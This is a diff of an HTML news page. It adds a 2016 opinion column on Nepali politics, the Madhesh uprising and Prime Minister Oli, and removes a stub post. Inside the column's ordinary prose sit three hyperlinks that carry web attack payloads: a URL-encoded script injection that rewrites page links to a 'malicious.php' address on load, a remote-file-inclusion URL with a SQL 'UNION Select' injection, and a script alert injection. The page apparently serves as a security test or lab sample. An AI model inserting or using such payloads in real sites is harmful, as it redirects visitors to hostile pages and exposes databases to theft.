@@ -8,10 +8,89 @@
 <div id="content">
 <!-- begin recent posts -->
 <div class="recent">
-<!-- begin post ----------------------------------------------->
 
 <h1 align="center"><font face="Arial" color="#00CCCC"><i>Opinion</i></font></h1>   
 
+<!-- Begin post -->
+
+
+
+<div class="single">
+<h2>A year on</h2>
+<p class="details"> Aug 17, 2016, 02.05 PM CET | <a href="#">Myrepublica</a> </p>
+
+
+<blockquote>The Indians first appropriated Madhesh Uprising III and then dumped it the moment they thought it had outlived its utility.</blockquote>
+
+
+<p>
+At least three tormenting tempests have hit teapots of the social cognoscenti in Kathmandu in recent days. Acclaimed orthopedic doctor and celebrated social healer Govinda KC resumed one of his periodic hunger strikes that he regularly undertakes to cleanse the medical education system.</p>
+<p>
+The game of musical chairs began once again at what was once the International Convention Center but now houses the unwieldy legislature of the country. And sales of green bangles began to skyrocket to mark the month of Mahadev—the presiding deity of abarnas (externalized castes) in the Hindu pantheon—as his female devotees decorated themselves with henna paste.</p>
+
+<p>
+<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
+Meanwhile, the silence</a> of the chattering classes over the alleged rape of a girl in Rupandehi reached deafening levels. Report of the Amnesty International recording vengefulness of law enforcement agencies in Kailali went almost unnoticed. Few in Kathmandu seem to know that more than five dozen people from Mahottari alone have been slapped with false charges and are living in self-exile across the border in India to escape arbitrary arrest or worse—staged encounters.
+</p>
+<p>
+The self-proclaimed patriotic intelligentsia has almost forgotten that barely a year ago, the country was embroiled in an existential crisis that challenged the very notion of communally-charged nationalism, something akin to what historian Richard Hofstadter had called the “Paranoid Style” of politics in the American context in the mid-1960s. The PEON is convinced that their tenacity won the day and the challenge to their hegemony has passed. The conclusion is perhaps correct: History indeed mostly travels through the pipeline of state power. But social eruptions too are not that uncommon.
+</p>
+<p>
+It’s impossible to raise questions over intent, resolve or means of KC’s single-minded mission to reform the medical education. Without people like him to save public conscience from time to time, societies turn infertile from the lack of redemptive irrigation of the collective soul. The problem with his undertaking is the complete absence of a larger political purpose and an appropriate organization. Even Mahatma Gandhi needed the vehicle called Indian National Congress and Jawaharlal Nehru to steer its course.
+</p>
+<p>
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
+The White Shirts that</a> tend to gather around KC are risk-averse group of weekend warriors indulging in ‘actorivism’ to champion fashionable issues. It was created to resist the people on behalf of the public. Occupy Wall Street gave birth to its copycat Occupy Baluwatar. Tax evasion by a profit-sector telecom service provider was the burning issue for a while. That has now cooled down considerably and lampooning Lok Man Singh Karki is the newest cool.
+</p>
+<p>
+The next agenda of ‘actorivist’ volunteers will probably be global warming because, “Don’t you know dude, the climate change affects the poorest most.” Never doubt the ability of the bourgeoisie to manufacture a trendy topic to rally around. Their capacity to engineer desirable outcomes in the political economy for the long term, however, remains severely limited the world over.
+</p>
+<p>
+Unless a critical mass of successful professionals are willing to put their careers on the line to pursue causes dear to their smartphone thumbs, the risk of KC becoming another Nand Prasad—the grieving father of Gorkha who starved himself to death in search of justice for his murdered son—shall remain high.</p>
+<p><b>Sectarian snarl</b></p>
+<p>
+The hubbub over the change of government is even more pointless. Premier Khadga Prasad Sharma Oli may have stayed in the position of supreme authority for only about two years—first as the de facto leader of the Khas-Arya (Khaa for short) community when Premier Sushil Koirala nominally presided over the government and then the de jure Prime Minister of the country—but he has destroyed generations through his politics of the paranoid. Premier Oli has institutionalized what can perhaps be called ‘Khaabad’ in Nepali or merely ‘Oliology’ in English to allude to the first and last names of its proponent.
+</p>
+<p>
+In plain terms, Oliology is a bigoted system of beliefs that contains the worst of majoritarian communalism, crony capitalism, vacuous chauvinism and opportunistic oligarchy and then seeks to ‘otherize’ Madheshis as internal threats and Indians as external enemies for the continuation of the complete control of the Khas-Arya over the country that the community considers to be its fatherland. As long as that remains the ruling ideology, change of guards at Singh Durbar will imply seamless continuity. Musical chair is a boring game for onlookers.
+</p>
+<p>
+The UML has long been wedded to Oliology, the current party chief merely codified its beliefs and gave it his name. The state of national emergency in the wake of Gorkha Earthquakes that devastated the mid-mountains provided Chairman Oli sufficient debris to sculpt the deity of majoritarian communalism. Without understanding Madhesh Uprising III that has unleashed several forces into the stagnating pond of Nepali politics, it’s impossible to loosen the hold of Oligarchy in the country.
+</p>
+<p>
+While formulating the conspiratorial 16-Point settlement in June, 2015, the PEON perhaps anticipated that there was going to be a backlash in Tarai-Madhesh. What it failed to foresee was the intensity of the uproar. Soon frightened, it closed its wagon even tighter and let the storm blow over in the name of resisting supposed Indian expansionism and outside interference in internal affairs.
+</p>
+<p>
+<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank">
+Border blockages gave </a> a convenient cover to hide behind mechanically chanted slogans of sovereignty, integrity and independence. In fact, all such cherished values shall remain at risk if positive processes of Madhesh Uprising III are allowed to waste and issues raised during the popular movement are left unaddressed.
+</p>
+<p><b>Uncritical masses</b></p>
+<p>
+Almost all postulates of political movements failed the test of Madhesh Uprising III. According to critical mass hypothesis, it is usually assumed that when about three percent of the population of a region pours out into the streets, the ruling regime is paralyzed into inaction and resolution becomes the only option of retaining its authority. The supposition probably comes from the belief that brutal suppression can be ruled out when security forces have their family members among protestors, which is inevitable when three percent of population are on the direct line of fire.</p>
+<p>
+Even when the postulated threshold was repeatedly crossed in Tarai-Madhesh, security forces had no hesitation in shooting the ‘otherized’ people of what perhaps appeared to them like occupied territories. Exclusionary composition of law enforcement agencies is a permanent threat to the national unity and political stability of any multi-ethnic country.</p>
+<p>
+Observers usually give three months to any political campaign to create a stir in society. After that period, protestors start to get constant media attention. The so-called international community begins to exercise its influence. The public intellectuals are shaken out of their habitual stupor.</p>
+<p>
+None of it worked even when Madhesh Uprising remained relentlessly on course between June, 2015 and February, 2016 for almost nine months and then has continued sporadically ever since.</p>
+<p>
+The composition of the newsroom in Nepal is even more monoethnic than its security forces. Almost the same holds true for what are called the public intellectuals serenading readers from op-ed pages and exhorting prime-time audience to patriotic duty. Together, they miserably failed to speak truth to power or hold the government accountable. Even though feeble, the media and the civil society had performed much better in 1989-90 when the country had to face a real trade blockade along the entire Indo-Nepal border for much longer.
+</p>
+<p>
+The international community was complicit in the conspiracy of formulating a constitution—any kind of constitution—in the hope of giving the status quo legitimate continuity. The Americans, the Scandinavians, the Swiss, the Germans, the Japanese and even Russians: Their unspoken priority was to tame the Maoists in the name of mainstreaming them. Madheshis were supposed to have been the headache of Indians. The Chinese kept a bemused watch over the unfolding situation and patiently waited to appropriate the winner.
+</p>
+<p>
+The Indians, as is their wont, waited till the last moment for their appeasement overtures to work its magic upon the PEON, which disdainfully dismissed their pacification policies as diplomatic feebleness. In desperation, they appropriated the Madhesh Uprising III temporarily and then dumped the moment they thought it had outlived its utility.
+</p>
+<p>
+Any political movement inevitably gives rise to subaltern solidarity. That postulate of popular movements remains to be tested. The future of Madhesh, and the country by extension, will be decided by the bond that evolves between the Pahadi Janjatis, the downtrodden of the Khas-Aryas, and the Madheshis in the days to come.</p>	
+
+
+
+</div>
+<!-- end post -->
+
+<!-- begin post ----------------------------------------------->
 
 <div class="single">
 <h2>Power games</h2>
@@ -71,18 +150,7 @@ The more practical option is to limit CIAA’s role into investigations. Absolut
 </div>
 <!-- end post -->
 
-<!-- Begin post -->
-<div class="single">
-<h2>Hungry  games</h2>
-<p class="details"> Aug 10, 2016, 02.05 PM IST | <a href="#">Myrepublica</a> </p>
 
-<p>
-The more practical option is to limit CIAA’s role into investigations. Absolute power is prone to absolute misuse. LSK’s predecessor was no angel and his successors are unlikely to fall from heavens. Lawmakers need to ignore the Dabloos and concentrate on constitutional amendments to control their Frankenstein.</p>	
-
-
-
-</div>
-<!-- end post -->
 
 <!-- Begin post -->
 
